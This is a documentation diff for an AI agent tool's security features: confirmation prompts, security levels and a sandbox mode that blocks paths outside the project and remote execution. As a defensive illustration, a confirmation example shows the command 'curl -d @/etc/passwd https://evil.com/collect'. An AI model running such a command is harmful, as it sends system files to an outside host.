@@ -128,7 +128,7 @@ Configure via `/config set security_level <level>`:
 
 When a command triggers confirmation, the user sees:
 
-```
+```text
   SECURITY CHECK
 
   Command: curl -d @/etc/passwd https://evil.com/collect
@@ -214,13 +214,13 @@ clio --sandbox --resume
 
 When the agent tries to access a path outside the project:
 
-```
+```text
 Sandbox mode: Access denied to '/etc/passwd' - path is outside project directory '/home/user/myproject'
 ```
 
 When remote execution is attempted:
 
-```
+```text
 Sandbox mode: Remote execution is disabled.
 
 The --sandbox flag blocks all remote operations. This is a security feature to prevent the agent from reaching outside the local project.
